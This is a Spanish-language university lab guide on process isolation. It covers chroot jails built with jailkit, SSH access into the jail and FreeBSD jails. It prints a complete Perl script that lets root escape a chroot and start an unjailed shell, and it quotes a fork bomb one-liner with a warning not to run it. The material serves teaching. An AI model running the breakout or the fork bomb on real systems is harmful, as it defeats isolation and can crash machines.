### Introducción a contenedores en Linux
Universidad ICESI  
Curso: Sistemas Operativos  
Docente: Daniel Barragán C.  
Tema: Introducción al aislamiento de procesos (chroot y jaulas BSD)
Correo: daniel.barragan at correo.icesi.edu.co

### Objetivos
* Conocer los fundamentos de las tecnologías de contenedores tipo LXC y LXD en Linux
* Crear entornos aislados para la ejecución de procesos a nivel del sistema operativo

### Introducción
En esta guía se introducen conceptos acerca de la tecnología de contenedores virtuales y sus fundamentos. Además se presentan
ejemplos a través de los cuales se podrá experimentar con cada una de dichas tecnologías. La información presentada es resultado de la recopilación de distintas fuentes de información, las referencias se presentan al final de la guía.

### Desarrollo

#### Chroot
**chroot** en los sistemas operativos derivados de Unix, es una operación que invoca un proceso, cambiando para este y sus hijos el directorio raíz del sistema. El sistema chroot fue introducido por Bill Joy el 18 de marzo de 1982.

La creación de un ambiente aislado con **chroot** implica varios pasos. En esta guía se empleará la herramienta jailkit que automatiza varios de los pasos para crear entornos **chroot**

Es posible instalar el rpm de jailkit directamente, sin embargo a continuación se presentan los pasos para la instalación desde las fuentes

```console
yum install gcc make wget bzip2 -y
cd /tmp
wget http://repo.iotti.biz/CentOS/7/srpms/jailkit-2.17-1.el7.lux.1.src.rpm
rpm2cpio jailkit-2.17-1.el7.lux.1.src.rpm | cpio -idmv
tar xvf jailkit-2.17.tar.bz2
cd jailkit-2.17/
./configure
make
make install
```

Configurar un chroot para un nuevo usuario
```console
adduser alice
mkdir /home/jail
chown root:root /home/jail
jk_init -v -j /home/jail basicshell editors extendedshell netutils ssh sftp scp jk_lsh
jk_jailuser -m -j /home/jail alice
mkdir /home/jail/tmp
chmod a+rwx /home/jail/tmp
vi /home/jail/etc/passwd

root:x:0:0:root:/root:/bin/bash
alice:x:1004:1004::/home/jane:/bin/bash

```

#### Usando chroot

Edite el archivo de configuración ssh para permitir conexiones remotas
```
vi /etc/ssh/sshd_config
```
```
# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no
#PasswordAuthentication no
```

Reinicie el servicio de ssh
```
# systemctl restart sshd
```

Realice una conexión remota como el usuario jane
```
# ssh alice@127.0.0.1
```

Una vez haya accedido con ssh, observe los archivos y directorios en la raíz
```
$ cd /
$ ls -al
```

**Nota**: Los entornos **chroot** no deben ser diseñados para aislar al usuario root.

#### Escapando de chroot

A continuación se demuestra como el usuario root puede **escapar** del ambiente aislado chroot.

Existen versiones de esta prueba en lenguaje C, para lo cual se requiere que en el entorno chroot se haya instalado
el compilador de C. Esta versión usa el lenguaje perl, por tanto se requiere que la **victima** al haber creado el entorno de chroot, haya realizado la instalación de perl.

Ejecute el siguiente comando para simular que se cuenta con el compilador de perl en el ambiente chroot
```
# jk_init -v -j /home/jail perl
```

Ingrese al ambiente chroot como root ejecutando el siguiente comando

```
# chroot /home/jail
```

Verifique que se encuentra dentro del entorno de chroot listando los archivos en el directorio raíz
```
# ls /
```

Por medio de un editor de texto escriba el siguiente script
```
vi prisionbreak.pl
```
```
#!/usr/bin/perl -w
use strict;
# unchroot.pl Dec 2007
# http://pentestmonkey.net/blog/chroot-breakout-perl

# This script may be used for legal purposes only.

# Go to the root of the jail
chdir "/";

# Open filehandle to root of jail
opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";

# Create a subdir, move into it
mkdir "mysubdir";
chdir "mysubdir";

# Lock ourselves in a new jail
chroot ".";

# Use our filehandle to get back to the root of the old jail
chdir(*JAILROOT);

# Get to the real root
while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}

# Lock ourselves in real root - so we're not really in a jail at all now
chroot ".";

# Start an un-jailed shell
system("/bin/sh");
```

Ejecute el script, y posteriormente vuelva a listar los archivos del directorio raíz
```
# ./prisionbreak.pl
# ls
```

**Nota**: Por favor no ser un script kiddie http://www.urbandictionary.com/define.php?term=script%20kiddie

#### FreeBSD Jails
FreeBSD es un sistema operativo open-source y descendiente directo de BSD (Berkeley Software Distribution). La primera versión fue liberada en 1993 y hoy en día es un sistema operativo ampliamente usada alrededor del mundo. La diferencia principal con Linux, es que FreeBSD es un sistema operativo completo (kernel, drivers de dispositivos, utilidades y documentación). Además la licencia que usa es la BSD license que permite modificaciones en el código fuente sin la obligación de liberar los cambios.

Las jaulas son un mecanismo de seguridad y una implementación para dar soporte a la virtualización. Es una mejora al método tradicional de chroot que aparece en la versión 4 de FreeBSD. Un proceso que se ejecuta en una jaula no puede acceder a recursos
por fuera de ella. Cada jaula tiene su propio hostname y dirección IP. Es posible ejecutar varias jaulas a la vez pero estas se ejecutan sobre el mismo kernel, por tanto solo se pueden ejecutar en ellas software soportado por el kernel de FreeBSD.

### Actividades

* Investigue en que consiste una bomba fork y como prevenirla usando las herramientas vistas en esta guía.

**Nota:** NO ejecute este comando en una consola hasta investigar primero que hace
```
# :(){ :|: & };:
```

### Referencias
http://linuxpitstop.com/chroot-ssh-users-on-centos-7/  
http://www.tldp.org/pub/Linux/docs/ldp-archived/system-admin-guide/translations/es/html/ch05s02.html  
https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/devices.txt
http://pentestmonkey.net/blog/chroot-breakout-perl

https://www.freebsd.org/  
